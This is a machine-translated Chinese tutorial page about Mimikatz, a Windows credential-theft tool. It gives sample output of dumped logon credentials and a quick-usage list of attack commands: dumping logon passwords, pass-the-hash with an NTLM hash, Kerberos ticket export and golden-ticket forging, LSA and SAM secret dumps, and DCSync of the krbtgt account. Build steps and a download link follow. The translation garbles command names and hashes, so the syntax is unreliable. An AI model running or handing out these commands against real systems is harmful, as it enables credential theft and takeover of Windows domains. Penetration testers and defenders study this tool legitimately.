# Mimikatz:玩 Windows 安全的小工具

> 原文：<https://kalilinuxtutorials.com/mimikatz-windows-security/>

Mimikatz 是我做的一个工具，用来学习`**C**`和做一些关于 Windows 安全性的实验。

Mimikatz:一个玩 Windows 安全的小工具 Mimikatz 还可以执行传递散列、传递票证或构建金票证。

**mimikatz 2.0 alpha (x86)发布《Kiwi en C》(2014 . 04 . 06 22:02:03)
本杰明·德尔皮**`**gentilkiwi**`**【benjamin@gentilkiwi.com】
http://blog.gentilkiwi.com/mimikatz(OE . EO)
带 13 个模块* * */
mimikatz # Privilege::debug
Privilege ' 20 ' OK
mimikatz # sekurlsa::logon passwords
认证 Id:0；515764 (00000000:0007deb4)
会话:互动自 2
用户名:詹蒂利奇异鸟
域名:VM-w7-ult-x
SID:S-1-5-21-1982681256-1210654043-1600862990-1000
msv:
【00000000000**

**也可理解为-[win pwn:内部 Windows 渗透测试/ AD 安全自动化](https://kalilinuxtutorials.com/winpwn-windows-penetrationtest-ad-security/)**

**快速用法**

**日志
权限::调试**

**塞库尔萨**

**sekurlsa::logon passwords
sekurlsa::tickets/export**
 **sekurlsa::PTH/user:administreur/domain:win XP/NTLM:f193d 757 B4 d 487 ab 7 e5a 3743 f 038 f 713/run:cmd**

**kerberos**

**Kerberos::list/export
Kerberos::PTT c:\ chocolate . kir bi**
 **Kerberos::golden/admin:administrator/domain:chocolate . local/sid:S-1-5-21-2365100805-3685010670/krbtgt:310 b 643 c 5316 c 8 C3 c 70 a 10 CFB 17 e 2e 31/ticket:chocolate**

**密码**

**crypto::capi**
**crypto::CNG**
 **crypto::certificates/export
crypto::certificates/export**
**/SYSTEM STORE:CERT _ SYSTEM _ STORE _ LOCAL _ MACHINE**

**crypto::keys/export**
**crypto::keys/MACHINE/export**

**跳马&跳马**

**vault::cred
vault::list
token::elevate
vault::cred
vault::list
LSA dump::Sam
LSA dump::secrets
LSA dump::cache
token::revert

LSA dump::DC sync/user:domain \ krbtgt/domain:lab . local**

**打造**

`**mimikatz**` 的形式是一个 Visual Studio 解决方案和一个 WinDDK 驱动程序(对于 main 操作是可选的)，所以先决条件是:

*   对于`**mimikatz**`**`**mimilib**`:桌面版 Visual Studio 2010、2012 或 2013(**2013 桌面版 Express 免费，支持 x86&x64**–[http://www.microsoft.com/download/details.aspx?id=44914](http://www.microsoft.com/download/details.aspx?id=44914))**
*   **对于`mimikatz driver`、`mimilove`(以及`ddk2003`平台):Windows 驱动工具包**7.1**(windk)–[http://www.microsoft.com/download/details.aspx?id=11800](http://www.microsoft.com/download/details.aspx?id=11800)**

 **`mimikatz`使用`SVN`进行源代码控制，但是现在`GIT`也可以使用了！你可以使用任何你想同步的工具，甚至包括 Visual Studio 2013 中的`GIT`=)

**构建解决方案**

*   打开解决方案后，`Build` / `Build Solution`(可以改变架构)
*   现在已经建成，可以使用了！(`Win32` / `x64`)
    *   关于`_build_.cmd`和`mimidrv`你可能会有错误`MSB3073`，这是因为没有 Windows 驱动程序包 **7.1** (WinDDK)就无法构建驱动程序，但是`mimikatz`和`mimilib`是可以的。

**ddk2003**

有了这个可选的 MSBuild 平台，您可以使用 WinDDK 构建工具和默认的`msvcrt`运行时(较小的二进制文件，没有依赖性)

对于这个可选平台来说，Windows 驱动工具包**7.1**(windk)–【http://www.microsoft.com/download/details.aspx?id=11800】T2 和 Visual Studio **2010** 是必须的，即使你打算以后使用 Visual Studio 2012 或 2013。

**信用:Benjamin delpy&Vincent le toux**

[**Download**](https://github.com/gentilkiwi/mimikatz)**